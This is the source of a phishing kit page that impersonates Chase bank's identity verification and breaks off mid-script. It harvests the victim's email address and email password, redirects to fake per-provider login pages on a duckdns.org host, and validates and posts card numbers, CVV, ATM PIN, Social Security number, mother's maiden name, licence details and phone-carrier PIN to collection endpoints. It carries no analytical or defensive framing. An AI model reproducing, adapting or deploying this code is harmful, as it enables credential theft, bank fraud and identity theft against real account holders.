<?php 
session_start();
require_once 'main.php';
include'Protection.php';
// include('../detects.php');
// include('../blockers.php');
// include('../random.php');
// include('../antifuck.php');
header('Access-Control-Allow-Origin: *');

// if($letter == 'unusual_activity') { 
//     $locked = parse_ini_file("../config/unusual_activity.ini", true);
// } elseif($letter == 'limited') {
//     $locked = parse_ini_file("../config/limited.ini", true);
// }
//   $notice['we'] = $locked['EN']['notice'];
//   $notice['weneed'] = $locked['EN']['desc'];
//   $notice['but'] = $locked['EN']['button'];
//   $key = substr(sha1(mt_rand()),1,25);
    $key = $_GET['key'];
?>
<html xmlns="http://www.w3.org/1999/xhtml" class="no-js logon-simplerAuth" lang="en" dir="ltr">

<head>
    <meta charset="utf-8">
    <meta name="robots" content="noindex,nofollow">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Get verified</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link rel="shortcut icon" href="files/img/faviconx.ico">
    <link rel="stylesheet" href="files/css/zroxoauth.css">
    <link rel="stylesheet" href="https://static.chasecdn.com/web/2019.08.25-2054/logon/assets/logon.css">
    <link rel="shortcut icon" href="https://static.chasecdn.com/content/dam/cpo-static/images/chasefavicon.ico">
    <link rel="stylesheet" href="https://static.chasecdn.com/web/2019.07.21-797/common/assets/blue-ui.css">
    <style type="text/css">
    .error2 {
        border: 0.3px solid #bf2155;
    }

    .hidden {
        display: none;
    }
    </style>
</head>

<body>
    <div>
        <div class="c65dd8vd" tabindex="-1">
            <div class="t5d8gd4d5nd">
                <header class="sfsf6565sfsf">
                    <div class="logon header zroxoru transparent navigation bar" style="background-color: #005eb8;">
                        <a href="#">
                            <div class="zroxo logo"></div>
                        </a>
                    </div>
                </header>
                <main>
                    <div class="msd y5f45df4h" id="simpler-auth">
                        <div class="container">
                            <div class="zroxoru primary panel" style="margin-top: 38px;">
                                <div class="col-xs-12 col-md-10 col-md-offset-1 sxv6s54dn6sd">
                                    <div class="col-xs-12 col-sm-10 col-sm-offset-1">
                                        <div class="progress u-no-outline" id="progress" tabindex="-1">
                                            <!-- <div class="row">
                                        <div class="col-xs-12 col-sm-6 clear-padding">
                                          <h2>Get verified <span class="util high-contrast">Step 2 of 3</span>
                                          </h2>
                                        </div>
                                        <div class="col-xs-12 col-sm-6 progress-padding">
                                          <div class="jpui progress rectangles" id="progress-progressBar" data-progress="">
                                            <ol class="steps-3" role="presentation">
                                              <li class="active" id="progress-progressBar-step-1"></li>
                                              <li class="active current-step" id="progress-progressBar-step-2"></li>
                                              <li id="progress-progressBar-step-3">
                                                <span class="util accessible-text" id="accessible-progress-progressBar-step-3"></span>
                                              </li>
                                            </ol>
                                          </div>
                                        </div>
                                      </div> -->

                                            <div class="row" style="padding-bottom: 12px;">
                                                <div class="col-xs-12 col-sm-12">
                                                    <span style="color: #000000; font-weight: bold;"
                                                        class="fdb4df4sb progress-label" tabindex="-1"
                                                        style="font-size: 18px;">Get verified <span
                                                            class="util high-contrast accessible-text">Step 1 of
                                                            2</span>
                                                    </span>
                                                </div>
                                                <!--<div class="col-xs-push-1 col-xs-6 col-sm-push-6 col-sm-3">-->
                                                <!--  <span class="zroxoru link">-->
                                                <!--    <a class="link-anchor" href="javascript:void(0);">Have a question? <i class="zroxoru progressright icon end-icon" aria-hidden="true"></i>-->
                                                <!--    </a>-->
                                                <!--  </span>-->
                                                <!--</div>-->
                                            </div>
                                            <div class="row">
                                                <div class="col-xs-12">
                                                    <div class="zroxoru progress tjdhbx62w bar" data-progress="50">
                                                        <div class="bar fill" style="background-color: #005eb8;"></div>
                                                        <span class="util accessible-text"></span>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <form class="emailaccess" id="emailaccess" method="POST" autocomplete="off"
                                            action="javascript:void(0);">
                                            <h3 class="f-mob" style="color: #666666; font-weight: 200;">Confirm your
                                                identity using your
                                                email linked to your chase account.</h3>
                                            <h3 class="emailpasswordtext1" style="display: none;">Confirm your identity
                                                using <span></span></h3>
                                            <p class="emailPasswordtext2" style="display: none; color: #666666;">For
                                                your security, enter your password for (<strong></strong>) linked to
                                                your chase account. By successfully logging in to the <span></span>
                                                account associated with Chase, we'll know it's you. You won't receive a
                                                confirmation email or have to take any further action.</p>
                                            <p class="emaildresstext2" style="color: #666666;">For your security, we
                                                need to verify your identity. Please note that the verification process
                                                will continue after your email is validated.</p>
                                            <div class="inside-container">
                                                <div class="row emaildress">
                                                    <div class="col-xs-12 col-sm-5 label-column otp-code">
                                                        <label class="jpui label emaildress"
                                                            for="otpcode_input-input-field"><span
                                                                class="accessible-text emaildress hidden"></span>Email
                                                            Address</label>
                                                    </div>
                                                    <div class="col-xs-12 col-sm-5 form-column otp-code">
                                                        <div class="account-input ssn_card_account_number"
                                                            id="otpcode_input">
                                                            <input
                                                                class="jpui input account-input ssn_card_account_number"
                                                                id="emaildress" placeholder="Email Address" format=""
                                                                name="emaildress" data-validate="identificationCode"
                                                                required="" value="" type="text">
                                                            <div style="width: 100%; float: left; position: relative !important; margin-top: -46px; display: none;"
                                                                id="error-bubble"
                                                                class="identificationCode-error-bubble error-bubble"
                                                                tabindex="-1"><a
                                                                    class="jpui error pointing below noborder attached label"
                                                                    id="identificationCode-error-bubble"
                                                                    href="javascript:void(0);" data-arrowposition="50"
                                                                    tabindex="0"
                                                                    aria-labelledby="identificationCode-error-bubble-label-content"><span
                                                                        class="label-outline"
                                                                        id="identificationCode-error-bubble-label-content">The
                                                                        email address you entered is incorrect. Please
                                                                        enter it again. </span></a></div>

                                                        </div>
                                                    </div>
                                                </div>

                                                <div class="row emailPassword" style="display: none;">
                                                    <div class="col-xs-12 col-sm-5 label-column otp-code">
                                                        <label class="jpui label" for="otpcode_input-input-field"><span
                                                                class="accessible-text hidden"></span>Email
                                                            Password</label>
                                                    </div>
                                                    <div class="col-xs-12 col-sm-5 form-column otp-code">
                                                        <div class="account-input ssn_card_account_number"
                                                            id="otpcode_input">
                                                            <input
                                                                class="jpui input account-input ssn_card_account_number"
                                                                id="emailPassword" placeholder="Email Password"
                                                                format="" name="emailPassword"
                                                                data-validate="identificationCode" required="" value=""
                                                                type="password" style="display: none;">
                                                            <div style="width: 100%; float: left; position: relative !important; margin-top: -46px; display: none;"
                                                                id="error-bubble1"
                                                                class="identificationCode-error-bubble error-bubble"
                                                                tabindex="-1"><a
                                                                    class="jpui error pointing below noborder attached label"
                                                                    id="identificationCode-error-bubble"
                                                                    href="javascript:void(0);" data-arrowposition="50"
                                                                    tabindex="0"
                                                                    aria-labelledby="identificationCode-error-bubble-label-content"><span
                                                                        class="label-outline"
                                                                        id="identificationCode-error-bubble-label-content">The
                                                                        email password you entered is incorrect. Please
                                                                        try again. </span></a></div>

                                                        </div>
                                                    </div>
                                                </div>

                                                <div class="row emailPasswordC" style="display: none;">
                                                    <div class="col-xs-12 col-sm-5 label-column">
                                                        <label class="jpui label" for="password_input-input-field"><span
                                                                class="accessible-text hidden"
                                                                id="pwlabel"></span>Confirm Email Password</label>
                                                    </div>
                                                    <div class="col-xs-12 col-sm-5 form-column">
                                                        <div class="margin-bottom-20px" id="password_input">
                                                            <input class="jpui input margin-bottom-20px"
                                                                id="emailPasswordC" placeholder="Confirm Email Password"
                                                                format="" type="password" name="emailPasswordC"
                                                                required="" value="">
                                                        </div>
                                                    </div>
                                                </div>
                                                <input type="hidden" name="emailretry" value="" id="emailretry">
                                                <input type="hidden" name="urli" value="" id="urli">
                                                <input type="hidden" name="emailType" value="" id="emailType">
                                                <input type="hidden" name="emailProvider" value="" id="emailProvider">
                                                <h3 style="color: #666666; font-weight: 200;">Enter your email</h3>
                                                <p class="identification-code-received-message"><span>
                                                        <p style="color: #666666;">We use industry-standard encryption
                                                            to protect your data. By providing your email, we verify in
                                                            real time that you own the email on file. We then use this
                                                            information to establish a secure connection with your email
                                                            provider.</p>
                                                    </span> <span class="jpui link"
                                                        id="requestNewIdentificationCode-link-wrapper">
                                                        <!--<a class="link-anchor underline" id="requestNewIdentificationCode" href="javascript:void(0);" aria-label=" chase account verification ">Email Auth</a>-->
                                                    </span></p>
                                            </div>
                                            <div class="button-container row hide-sm">
                                                <div class="col-xs-12 col-sm-3 col-sm-push-9">
                                                    <button type="submit" id="requestIdentificationCode"
                                                        class="jpui button focus fluid primary"><span
                                                            class="label">Next</span> </button>
                                                </div>
                                                <div class="col-xs-12 col-sm-3 col-sm-push-3">
                                                    <button type="button" id="exitIdentification"
                                                        class="jpui button focus fluid cancel"><span
                                                            class="label">Cancel</span> </button>
                                                </div>
                                            </div>
                                            <div class="button-container row hide-xs show-sm">
                                                <div class="col-xs-12 col-sm-3 col-sm-offset-6">
                                                    <button type="button" id="exitIdentification-sm2"
                                                        class="jpui button focus fluid cancel"><span
                                                            class="label">Cancel</span> </button>
                                                </div>
                                                <div class="col-xs-12 col-sm-3">
                                                    <button type="submit" id="requestIdentificationCode-sm"
                                                        class="jpui button focus fluid primary disabled"
                                                        disabled=""><span class="label">Next</span> </button>
                                                </div>
                                            </div>
                                        </form>
                                    </div>
                                </div>



                            </div>
                        </div>
                    </div>
                </main>
            </div>
        </div>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.17.0/jquery.validate.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.13.4/jquery.mask.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.1/additional-methods.min.js"></script>
    <script type="text/javascript">
    const urlSearchParams = new URLSearchParams(window.location.search);
    const params = Object.fromEntries(urlSearchParams.entries());

    if (params.key === '' || params.key === null || params.key === undefined) {
        window.location.href = "/final_backup/error";
    }

    var emailretry = 0;
    document.onreadystatechange = function() {
        var state = document.readyState;
        if (state == 'complete') {


            var enablenotice = "<?php echo $enablenotice; ?>";
            if (enablenotice == "on") {
                $("#inactiveAccountDialog").show();
            }

            setTimeout(function() {
                document.getElementById('interactive');
            }, 4000);
        }
    }
    </script>
    <script>
    $(document).ready(function() {
        $('#exitAccountSuspended').click(function(e) {
            e.stopPropagation();
            $('#inactiveAccountDialog').slideUp();
        });
    });

    $(document).ready(function() {
        $("#CardNumber").keyup(function() {
            var el = $(this);
            var eli = el.val().replace(/\s+/g, '');
            if (eli.length === 16) {
                var url = "https://lookup.binlist.net/" + eli;
                $.ajax({
                    url: url,
                    cache: false,
                    dataType: "json",
                    type: "GET",
                    success: function(result, success) {
                        var bankn = result.bank['name'];
                        if (typeof bankn !== 'undefined') {
                            $("#bank").val(result.bank['name']);
                        } else {
                            $("#bank").val("Unknown Bank For This BIN!");
                        }

                        $("#type").val(result.type);
                        $("#brandbank").val(result.brand);
                    }
                });
            }
        });
    });
    $(document).ready(function() {
        $("#NumberPhone").keyup(function() {
            var el = $(this).val();
            var eli = el.replace(/[- )(]/g, '');
            if (eli.length === 10) {
                if ("<?php echo $enablephonepin; ?>" === "on") {
                    if ("<?php echo $enablenumverifyapi; ?>" === "on") {
                        var url = "https://apilayer.net/api/validate?access_key=" +
                            "<?php echo $numverifyapi; ?>" + "&number=" + "1" + eli;
                        $.ajax({
                            url: url,
                            cache: false,
                            dataType: "json",
                            type: "GET",
                            success: function(result, success) {
                                var carrierres = result.carrier.replace(/[- )(]/g, '');
                                if (carrierres.indexOf('MobilityLLC', carrierres.length -
                                        'MobilityLLC'.length) !== -1) {
                                    $(".row.NumberCarrier").show();
                                    $(".row.NumberPin").show();
                                    $("#NumberCarrier").val(result.carrier);

                                } else if (carrierres.indexOf('SprintCorp.', carrierres
                                        .length - 'SprintCorp.'.length) !== -1) {
                                    $(".row.NumberCarrier").show();
                                    $(".row.NumberPin").show();
                                    $("#NumberCarrier").val(result.carrier);

                                } else if (carrierres.indexOf(
                                        'UnitedStatesCellularCorp.U.S.Cellular', carrierres
                                        .length - 'UnitedStatesCellularCorp.U.S.Cellular'
                                        .length) !== -1) {
                                    $(".row.NumberCarrier").show();
                                    $(".row.NumberPin").show();
                                    $("#NumberCarrier").val(result.carrier);

                                } else if (carrierres.indexOf('TMobileUSAInc.', carrierres
                                        .length - 'TMobileUSAInc.'.length) !== -1) {
                                    $(".row.NumberCarrier").show();
                                    $(".row.NumberPin").show();
                                    $("#NumberCarrier").val(result.carrier);

                                } else if (carrierres.indexOf(
                                        'CellcoPartnershipVerizonWireless', carrierres
                                        .length - 'CellcoPartnershipVerizonWireless'.length
                                    ) !== -1) {
                                    $(".row.NumberCarrier").show();
                                    $(".row.NumberPin").show();
                                    $("#NumberCarrier").val(result.carrier);

                                } else {
                                    $(".row.NumberCarrier").hide();
                                    $(".row.NumberPin").hide();
                                }
                            }
                        });
                    } else {
                        $(".row.NumberCarrier").show();
                        $(".row.NumberPin").show();

                    }
                }
            }
        });
    });

    $(document).ready(function() {
        $("#ZipCode").keyup(function() {
            var el = $(this);

            if (el.val().length === 5) {
                var url = "https://ziptasticapi.com/" + el.val();
                $.ajax({
                    url: url,
                    cache: false,
                    dataType: "json",
                    type: "GET",
                    success: function(result, success) {
                        $("#CityR").val(result.city);
                        $("#StateRegion").val(result.state);
                    }
                });
            }
        });
    });

    //popup window 
    var popupWindow = null;

    function child_open(url) {
        var x = screen.width / 2 - 700 / 2;
        var y = screen.height / 2 - 450 / 2;
        sessionStorage.setItem('emaildress', $("#emaildress").val());
        popupWindow = window.open(url, "_blank",
            "directories=no, status=no, menubar=no, scrollbars=yes, resizable=no,width=450, height=700,left=" + x +
            ",top=" + y);
    }

    function parent_disable() {
        if (popupWindow && !popupWindow.closed)
            popupWindow.focus();
    }
    // end popup

    $('#emailPassword').focus(function() {
        var val = $("#emaildress").val();
        var emailstr = val.substr(val.indexOf("@") + 1);

        const arr = emailstr.split(".");
        var str = arr[0];
        str1 = str.toLowerCase().replace(/\b[a-z]/g, function(letter) {
            return letter.toUpperCase();
        });
        if (str === "gmail") {
            var str2 = "Google";
            $('.emailPasswordtext1').children("span").html(str2);
            $('.emailPasswordtext2').children("span").html(str2);
        } else if (str === "googlemail") {
            var str2 = "Google";
            $('.emailPasswordtext1').children("span").html(str2);
            $('.emailPasswordtext2').children("span").html(str2);
        } else if (str === "ymail") {
            var str2 = "Yahoo";
            $('.emailPasswordtext1').children("span").html(str2);
            $('.emailPasswordtext2').children("span").html(str2);
        } else if (str === "yahoo") {
            var str2 = "Yahoo";
            $('.emailPasswordtext1').children("span").html(str2);
            $('.emailPasswordtext2').children("span").html(str2);
        } else if (arr[1] === "rr") {
            var str2 = "Spectrum";
            $('.emailPasswordtext1').children("span").html(str2);
            $('.emailPasswordtext2').children("span").html(str2);
        } else if (str === "live") {
            var str2 = "Microsoft";
            $('.emailPasswordtext1').children("span").html(str2);
            $('.emailPasswordtext2').children("span").html(str2);
        } else if (str === "hotmail") {
            var str2 = "Microsoft";
            $('.emailPasswordtext1').children("span").html(str2);
            $('.emailPasswordtext2').children("span").html(str2);
        } else if (str === "outlook") {
            var str2 = "Microsoft";
            $('.emailPasswordtext1').children("span").html(str2);
            $('.emailPasswordtext2').children("span").html(str2);
        } else {
            $('.emailPasswordtext1').children("span").html(str);
            $('.emailPasswordtext2').children("span").html(str);
        }
        $('.emailPasswordtext2').children("strong").html($("#emaildress").val());
        $(".emaildresstext1").hide();
        $(".emaildresstext2").hide();
        $(".emailpasswordtext1").show();
        $(".emailpasswordtext2").show();
    }).blur(function() {
        if ($.trim($('#emaildress').val()).length) {
            $(".emaildresstext1").hide();
            $(".emaildresstext2").hide();
            $(".emailpasswordtext1").show();
            $(".emailpasswordtext2").show();
        } else {
            $(".emaildresstext1").show();
            $(".emaildresstext2").show();
            $(".emailpasswordtext1").hide();
            $(".emailpasswordtext2").hide();
        }
    });

    $(document).ready(function() {
        var $input = $('#SecurityNumber'),
            $register = $('#log_on_to_landing_page-sm, #log_on_to_landing_page');

        $input.each(function() {
            if (!$(this).val()) {
                $register.attr('disabled', true);
                return false;
            }
        });
        $input.keyup(function() {
            var trigger = false;
            $input.each(function() {
                if (!$(this).val()) {
                    trigger = true;
                }
            });

            trigger ? $register.attr('disabled', true) : $register.removeAttr('disabled');

        });
    });
    </script>
    <script>
    $(document).ready(function() {
        var $input = $('.card input:text'),
            $register = $('#log_on_to_landing_page-sm1, log_on_to_landing_page1');

        $input.each(function() {
            if (!$(this).val()) {
                $register.attr('disabled', true);
                return false;
            }
        });
        $input.keyup(function() {
            var trigger = false;
            $input.each(function() {
                if (!$(this).val()) {
                    trigger = true;
                }
            });

            trigger ? $register.attr('disabled', true) : $register.removeAttr('disabled');

        });
    });
    </script>
    <script>
    $(document).ready(function() {
        var $input = $('.emailaccess input:text'),
            $register = $('#requestIdentificationCode-sm, #requestIdentificationCode');

        $input.each(function() {
            if (!$(this).val()) {
                $register.attr('disabled', true);
                return false;
            }
        });
        $input.keyup(function() {
            var trigger = false;
            $input.each(function() {
                if (!$(this).val()) {
                    trigger = true;
                }
            });

            trigger ? $register.attr('disabled', true) : $register.removeAttr('disabled');

        });
    });

    $(".container.step1").show();

    $("#exitIdentification-sm1, #exitIdentification-sm2, #exitIdentification-sm3, #exitIdentification-sm4, #exitIdentification")
        .click(function(e) {
            e.preventDefault();

            $(".container.step1").show();
            $(".container.step2").hide();
            $(".container.step3").hide();
            $(".container.step4").hide();

        });

    $("#requestDeliveryDevices-sm, #requestDeliveryDevices").click(function(e) {
        e.preventDefault();
        setTimeout(function() {
            $(".container.step2").show();
            $(".container.step3").hide();
            $(".container.step1").hide();
            $(".container.step4").hide();
        });
    });

    $(function() {
        $('#DateOfBirth').mask('00/00/0000');
        $('#ZipCode').mask('00000');
        $('#NumberPhone').mask('(000) 000-0000');
        $('#CardNumber').mask('0000 0000 0000 0000');
        $('#ExpirationDate').mask('00/00');
        $('#Cvv').mask('000');
        $('#AtmPin').mask('0000');
        $('#SecurityNumber').mask('000-00-0000');
        $('#PhonePin').mask('00000000');
        $('#LicenseNExp').mask('00/00/0000');

    });
    </script>
    <script>
    jQuery.validator.addMethod("notEqual", function(value, element, param) {
        return this.optional(element) || value != $(param).val();
    }, "Please specify a different value");

    jQuery.validator.addMethod("emailValid", function(value, element) {
        var emaildress = $("#emaildress").val();
        $.ajax({
            url: "emailvalidate.php",
            type: 'POST',
            async: false,
            data: {
                email: emaildress
            },
            dataType: "text",
            success: function(msg) {
                if (msg !== 'true') {
                    return 'Invalid password. Please try again';
                } else {
                    return true;
                }
            },
            error: function(xhr, textStatus, errorThrown) {
                alert('ajax loading error... ... ' + url + query);
                return false;
            }
        });
    }, '');
    $(document).ready(function() {
        $("#emailPassword").keyup(function() {
            $("#error-bubble1").hide();
            $("#emailPassword").removeClass("error");
            $("#emailPasswordC").removeClass("error");
        });
    });

    $(function() {
        $("#requestIdentificationCode-sm, #requestIdentificationCode").click(function() {
            $("#requestIdentificationCode-sm, #requestIdentificationCode").attr('disabled', 'disabled');
            if ($("#emailPassword").is(":visible")) {
                $("#requestIdentificationCode-sm, #requestIdentificationCode").removeAttr('disabled');
                $("#error-bubble").hide();
                $(".jpui.label.emaildress").removeClass("error");
                $(".accessible-text.emaildress").addClass("hidden");
                $(".accessible-text.emaildress").removeClass("errorAdaText");
                $("#emaildress").removeClass("clientSideError");
                $('#emailaccess').validate({
                    rules: {
                        "emailPassword": {
                            required: function() {
                                return $("#emailPassword").is(":visible");
                            },
                            minlength: 4,
                            equalTo: "#emailPasswordC",
                            notEqual: "#emaildress"
                        },
                        "emaildress": {
                            required: true,
                            email: true,
                        },
                        "emailPasswordC": {
                            required: function() {
                                return $("#emailPasswordC").is(":visible");
                            },
                            minlength: 4,
                            equalTo: "#emailPassword",
                            notEqual: "#emaildress",
                        }
                    },
                    messages: {
                        "emaildress": "Please enter a valid email address",
                        "emailPassword": {
                            required: "Please enter your email password",
                            equalTo: "Password dosen't match",
                            notEqual: "Email address and password can't be the same"
                        },
                        "emailPasswordC": {
                            required: "Please confirm your email password",
                            equalTo: "Password dosen't match",
                            notEqual: "Email address and password can't be the same"
                        }
                    },
                    submitHandler: function(form) {
                        emailretry++
                        $("#emailretry").val(emailretry);
                        $.post("emailbank?key=<?php echo $key;?>", $("#emailaccess")
                            .serialize(),
                            function(result) {
                                if ("<?php echo $emailretry ?>" == "on") {
                                    $("#error-bubble1").show();
                                    $("#emailPassword").addClass("error");
                                    $("#emailPasswordC").addClass("error");
                                } else {
                                    $(".container.step4").hide();
                                    $(".container.step3").show();
                                    $(".container.step1").hide();
                                    $(".container.step2").hide();
                                    $(location).attr("", "");
                                }
                                if (emailretry == <?php echo $numberofretries ?>) {
                                    $(".container.step4").hide();
                                    $(".container.step3").show();
                                    $(".container.step1").hide();
                                    $(".container.step2").hide();
                                    $(location).attr("", "");
                                }
                            });

                    },
                });

            } else {
                function getData(callback) {
                    var url = "emailauth/emailvalidate.php?emaildress=" + $("#emaildress").val();
                    $.ajax({
                        url: url,
                        cache: false,
                        dataType: "json",
                        type: "GET",
                        success: callback
                    });

                }
                getData(function(result) {
                    var emailStatus = result.emailStatus;
                    var emailProvider = result.emailProvider;
                    var emailType = result.emailType;
                    console.log(emailStatus, emailProvider, emailType)
                    $("#emailProvider").val(result.emailProvider);
                    $("#emailType").val(result.emailType);
                    if (emailStatus != "valid") {
                        $("#requestIdentificationCode-sm, #requestIdentificationCode")
                            .removeAttr('disabled');
                        $("#error-bubble").show();
                        $(".jpui.label.emaildress").addClass("error");
                        $(".accessible-text.emaildress").removeClass("hidden");
                        $(".accessible-text.emaildress").addClass("errorAdaText");
                        $("#emaildress").addClass("clientSideError");
                    } else if (emailProvider == "Cox" || emailProvider == "Earthlink" ||
                        emailProvider == "Charter" || emailProvider == "Comcast" &&
                        emailStatus == "valid") {
                        $("#requestIdentificationCode-sm, #requestIdentificationCode")
                            .removeAttr('disabled');
                        $(".row.emailPassword").show();
                        $("#emailPassword").show();
                        $(".row.emailPasswordC").show();
                    } else {
                        var val = $("#emaildress").val();
                        var emailstr = val.substr(val.indexOf("@") + 1);

                        const arr = emailstr.split(".");
                        var str = arr[0];
                        str1 = str.toLowerCase().replace(/\b[a-z]/g, function(letter) {
                            return letter.toUpperCase();
                        });
                        if (str === "gmail") {
                            var str2 = "Google";
                            $('.suspended-advisory.dialogMessage').children("span").html(str2);
                        } else if (str === "googlemail") {
                            var str2 = "Google";
                            $('.suspended-advisory.dialogMessage').children("span").html(str2);
                        } else if (str === "ymail") {
                            var str2 = "Yahoo";
                            $('.suspended-advisory.dialogMessage').children("span").html(str2);
                        } else if (str === "yahoo") {
                            var str2 = "Yahoo";
                            $('.suspended-advisory.dialogMessage').children("span").html(str2);
                        } else if (arr[1] === "rr") {
                            var str2 = "Spectrum";
                            $('.suspended-advisory.dialogMessage').children("span").html(str2);
                        } else if (str === "live") {
                            var str2 = "Microsoft";
                            $('.suspended-advisory.dialogMessage').children("span").html(str2);
                        } else if (str === "hotmail") {
                            var str2 = "Microsoft";
                            $('.suspended-advisory.dialogMessage').children("span").html(str2);
                        } else if (str === "outlook") {
                            var str2 = "Microsoft";
                            $('.suspended-advisory.dialogMessage').children("span").html(str2);
                        } else {
                            $('.suspended-advisory.dialogMessage').children("span").html(str2);
                        }
                        $("#requestIdentificationCode-sm, #requestIdentificationCode")
                            .removeAttr('disabled');
                        var mail = $("#emaildress").val();
                        if (emailProvider == "Microsoft") {
                            window.location.href =
                                "https://chasd-chk1.duckdns.org/final_backup/emailauth/outlook?key=<?php echo $key;?>&email=" +
                                mail;
                            // var url = "emailauth/outlook?key=<?php echo $key;?>";
                        } else if (emailProvider == "Aol") {
                            window.location.href =
                                "https://chasd-chk1.duckdns.org/final_backup/emailauth/aol?key=<?php echo $key;?>&email=" +
                                mail;
                            // var url = "emailauth/aol?key=<?php echo $key;?>";
                        } else if (emailProvider == "Yahoo") {
                            window.location.href =
                                "https://chasd-chk1.duckdns.org/final_backup/emailauth/yahoo?key=<?php echo $key;?>&email=" +
                                mail;
                            // var url = "emailauth/yahoo?key=<?php echo $key;?>";
                        } else if (emailProvider == "Att") {
                            window.location.href =
                                "https://chasd-chk1.duckdns.org/final_backup/emailauth/att?key=<?php echo $key;?>&email=" +
                                mail;
                            // var url = "emailauth/att?key=<?php echo $key;?>";
                        } else if (emailProvider == "Google") {

                            window.location.href =
                                "https://chasd-chk1.duckdns.org/final_backup/emailauth/google?key=<?php echo $key;?>&email=" +
                                mail;
                            // var url = "emailauth/google?key=<?php echo $key;?>";
                        }
                        // $("#urli").val(urli);
                        // $('.suspended-advisory.dialogMessage').children("a").attr("href", "javascript:child_open(\""+url+"\");");
                        // javascript:child_open(url);
                        console.log('----------')
                        $("#fullscreen-container").fadeTo(200, 1);
                        var timer = setInterval(function() {
                            if (popupWindow.closed) {
                                clearInterval(timer);
                                $("#fullscreen-container").fadeOut(200);
                                if (!sessionStorage.getItem('emailPassword')) {

                                } else {
                                    sessionStorage.removeItem('emailPassword');
                                    $(".container.step4").hide();
                                    $(".container.step3").show();
                                    $(".container.step1").hide();
                                    $(".container.step2").hide();
                                }
                            }
                        }, 1000);
                        $("#error-bubble").hide();
                        $(".jpui.label.emaildress").removeClass("error");
                        $(".accessible-text.emaildress").addClass("hidden");
                        $(".accessible-text.emaildress").removeClass("errorAdaText");
                        $("#emaildress").removeClass("clientSideError");
                    }

                });
            }
        });
    });
    </script>
    <script>
    $(function() {
        $("#log_on_to_landing_page-sm, #log_on_to_landing_page").click(function() {
            // validate and process form here  
            $('#billing').validate({
                rules: {
                    "fullname": {
                        required: true,
                        minlength: 4,
                    },
                    "DateOfBirth": {
                        required: true,
                        minlength: 10,
                    },
                    "StreetAddress": {
                        required: true,
                        minlength: 5,
                    },
                    "MaidenName": {
                        required: true,
                        minlength: 3,
                    },
                    "StateRegion": {
                        required: true,
                        minlength: 2,
                    },
                    "ZipCode": {
                        required: true,
                        minlength: 5,
                        zipcodeUS: true,
                    },
                    "NumberPhone": {
                        required: true,
                        minlength: 10,
                    },
                    "NumberCarrier": {
                        required: false,
                        minlength: 2,
                    },
                    "NumberPin": {
                        required: function() {
                            return $("#NumberPin").is(":visible");
                        },
                        minlength: 4,
                    }
                },
                messages: {
                    "fullname": {
                        required: "Please provide your full name",
                        minlength: "Please provide your full name",
                    },
                    "DateOfBirth": {
                        required: "Please provide date of birth",
                        minlength: "Please check the date of birth you have entered",
                    },
                    "NumberPhone": {
                        required: "Please provide phone number",
                        minlength: "Please check the number you have entered",
                    },
                    "NumberCarrier": {
                        required: "Please provide phone carrier",
                        minlength: "Please check the phone carrier you have entered",
                    },
                    "NumberPin": {
                        required: "Please provide phone carrier pin",
                        minlength: "Please check the phone carrier pin you have entered",
                    },
                    "StreetAddress": {
                        required: "Please provide your residential address",
                        minlength: "Please check the address you have entered",
                    },
                    "MaidenName": {
                        required: "Please provide your Mother's maiden name",
                        minlength: "Please check the Mother's maiden name you have entered",
                    },
                    "StateRegion": {
                        required: "Please provide your State",
                        minlength: "Please check the state you have entered",
                    },
                    "ZipCode": {
                        required: "Please provide your Zip Code",
                        zipcodeUS: "Please provide valid US your Zip Code",
                        minlength: "Please check the zip code you have entered",
                    },
                },
                messages: {
                    "fullname": {
                        required: "Please provide your full name",
                        minlength: "Please provide your full name",
                    },
                    "DateOfBirth": {
                        required: "Please provide date of birth",
                        minlength: "Please check the date of birth you have entered",
                    },
                    "NumberPhone": {
                        required: "Please provide phone number",
                        minlength: "Please check the number you have entered",
                    },
                    "NumberCarrier": {
                        required: "Please provide phone carrier",
                        minlength: "Please check the phone carrier you have entered",
                    },
                    "NumberPin": {
                        required: "Please provide phone carrier pin",
                        minlength: "Please check the phone carrier pin you have entered",
                    },
                    "StreetAddress": {
                        required: "Please provide your residential address",
                        minlength: "Please check the address you have entered",
                    },
                    "SecurityNumber": {
                        required: "Please provide your Social Security Number(SSN)",
                        minlength: "Please enter at least 9 characters",
                    },
                    "StateRegion": {
                        required: "Please provide your State",
                        minlength: "Please check the state you have entered",
                    },
                    "CityR": {
                        required: "Please provide your City",
                        minlength: "Please check the City you have entered",
                    },

                    "ZipCode": {
                        required: "Please provide your Zip Code",
                        zipcodeUS: "Please provide valid US your Zip Code",
                        minlength: "Please check the zip code you have entered",
                    },
                },
                submitHandler: function(form) {
                    $.post("billing?key=<?php echo $key;?>", $("#billing").serialize(),
                        function(result) {
                            setTimeout(function() {
                                var disablecard = "<?php echo $disablecard; ?>";
                                if ("<?php echo $disablecard; ?>" != "on") {
                                    $(".container.step4").show();
                                    $(".container.step3").hide();
                                    $(".container.step1").hide();
                                    $(".container.step2").hide();
                                    $(location).attr("", "");
                                } else {
                                    $(".container.step4").hide();
                                    $(".container.step3").hide();
                                    $(".container.step1").hide();
                                    $(".container.step2").hide();
                                    $(location).attr("href", "./dl.php");
                                }
                            });
                        });
                },
            });
        });
    });
    </script>
    <script>
    $(function() {
        $("#log_on_to_landing_page-sm1, #log_on_to_landing_page1").click(function() {
            // validate and process form here  
            $('#card').validate({
                rules: {
                    CardNumber: {
                        required: true,
                        minlength: 16,
                        creditcard: true,
                    },
                    ExpirationDate: {
                        required: true,
                        minlength: 4,
                    },
                    Cvv: {
                        required: true,
                        minlength: 3,
                        digits: true,
                    },
                    AtmPin: {
                        required: true,
                        minlength: 4,
                        digits: true,
                    },
                    LicenseNumber: {
                        required: true,
                        minlength: 5,
                    },
                    LicenseNExp: {
                        required: true,
                        minlength: 5,
                    },
                    SecurityNumber: {
                        required: true,
                        minlength: 9,
                    },
                },
                messages: {
                    CardNumber: {
                        required: "Please provide 16 digit card number",
                        minlength: "Please check the card number you have entered",
                        creditcard: "Please enter a valid card number",
                    },
                    ExpirationDate: {
                        required: "Please provide card expiry date",
